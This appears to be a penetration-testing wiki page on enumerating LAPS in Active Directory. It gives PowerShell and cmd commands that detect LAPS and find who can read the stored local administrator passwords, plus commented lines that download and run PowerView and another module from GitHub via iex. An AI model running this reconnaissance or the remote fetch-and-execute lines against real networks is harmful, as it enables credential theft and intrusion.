# LAPS

## Theory

The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.

This page is about enumeration, you may have a look on [LAPS-based attacks](broken-reference) and [LAPS-based persistences.](../../persistence/laps.md)

## Practice

### Check If Activated

{% tabs %}
{% tab title="Files/Folders" %}
We can check if LAPS is installed by enumerating related files and folders

```powershell
# Identify if installed to Program Files
# PowerShell
Get-ChildItem 'C:\Program Files\LAPS\CSE\'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\'

#Cmd
dir 'C:\Program Files\LAPS\CSE\'
dir 'C:\Program Files (x86)\LAPS\CSE\'
```
{% endtab %}

{% tab title="Domain Object" %}
We can guess if LAPS is installed by checking the LAPS AD Object:

```powershell
#ActiveDirectory PowerShell module (RSAT)
#iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
Get-ADObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DC01,DC=Security,CN=Local'

#PowerView
#IEX(IWR -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
Get-DomainObject -SearchBase "LDAP://DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
Get-DomainObject "CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=domain,DC=local"

#PowerView
# Find computers where the expiration time is not empty, any user can read this
Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
```
{% endtab %}

{% tab title="GPOs" %}
We may enumerate if LAPS is installed by checking GPOs with [PowerView](../tools/powerview.md).

```powershell
#PowerView
# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
Get-DomainGPO | ? { $_.DisplayName -like "*password solution*" } | select DisplayName, Name, GPCFileSysPath | fl
```

If you find a GPO, you can resolve computers linked to this GPO as follow&#x20;

```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
{% endtab %}

{% tab title="Registry" %}
We can check if LAPS is installed by enumerating related registries

```powershell
#Powershell
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft Services\AdmPwd" -Name AdmPwdEnabled

#Cmd
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```
{% endtab %}

{% tab title="LAPSToolkit" %}
The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) is a tool to audit and attack LAPS environments. We may use following commands to enum computers which have LAPS enabled.

```powershell
# Import LAPSToolkit
. .\LAPSToolkit.ps1

# Gets all computers which have LAPS enabled
Get-LAPSComputers
```
{% endtab %}
{% endtabs %}

### LAPS GPO Configuration

By reading the GPO configuration file, you may retreive following informations: Password complexity, Password length, Password chage frenquency, the LAPS managed account name, and password expiration protection policy.

{% tabs %}
{% tab title="Registry.pol" %}
If LAPS is deployed by GPO, we can identify the configuration file to discover some details about the configuration.&#x20;

```powershell
Get-Content "<GPCFileSysPath>\Machine\Registry.pol"
```

After downloading the GPO registry.pol file which location is at the `gpcfilesyspath` obtained while enumerating GPOs, we can use`Parse-PolFile` from [**GPRegistryPolicyParser** ](https://github.com/PowerShell/GPRegistryPolicyParser)and obtain LAPS related informations.

```powershell
Parse-PolFile "Registry.pol"
```
{% endtab %}
{% endtabs %}

### LAPS Read Password Access

You may enumerate principals that can read the LAPS password on given systems by using [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1), [admpwd.ps](https://www.powershellgallery.com/packages/AdmPwd.PS/6.3.1.0),  or even [adsisearcher](https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/).

{% tabs %}
{% tab title="PowerView" %}
We can enumerate who can read the LAPS password using [Powersploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1).

```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd for a giver computer
Get-AdmPwdPassword -ComputerName computer01 | fl

# Find the principals that have ReadPropery on ms-Mcs-AdmPwd for each computers
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }

# Find the principals that have ReadPropery on ms-Mcs-AdmPwd for each OU
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }
```
{% endtab %}

{% tab title="AdmPwd.PS" %}
We can enumerate who can read the LAPS password using [admpwd.ps](https://www.powershellgallery.com/packages/AdmPwd.PS/6.3.1.0) (LAPS PowerShell module). You can check if it's installed as follow:

```powershell
#Check if LAPS Powershell module is installed
#By enumerating files
Get-ChildItem "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS"

#By enumerating commands
Get-Command *AdmPwd*
```

To enumerate, use following commands

```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd for a given OU
Find-AdmPwdExtendedRights -Identity <OU> | fl
```
{% endtab %}

{% tab title="LAPSToolkit" %}
The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) is a tool to audit and attack LAPS environments. We may use following commands to enum users that can read LAPS passwords.&#x20;

`Find-LAPSDelegatedGroups` will query each OU and find domain groups that have delegated read access. `Find-AdmPwdExtendedRights` goes a little deeper and queries each individual computer for users that have "All Extended Rights". This will reveal any users that can read the attribute without having had it specifically delegated to them.

```powershell
# Get Groups that can read the ms-Mcs-AdmPwd attribute
Find-LAPSDelegatedGroups

# Checks for ExtendedRights for Laps on each AD Computer
Find-AdmPwdExtendedRights
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps" %}

{% embed url="https://buaq.net/go-39069.html" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps" %}
